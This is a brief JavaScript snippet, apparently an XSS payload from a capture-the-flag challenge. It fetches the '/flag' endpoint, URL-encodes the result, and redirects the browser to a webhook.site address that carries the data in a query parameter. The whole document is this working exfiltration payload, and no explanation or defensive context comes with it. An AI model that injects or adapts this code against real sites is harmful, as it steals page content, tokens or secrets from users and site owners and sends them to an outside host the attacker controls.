async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('/flag');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://webhook.site/0ca2d115-4816-4982-9f73-4fc48e2173e9');
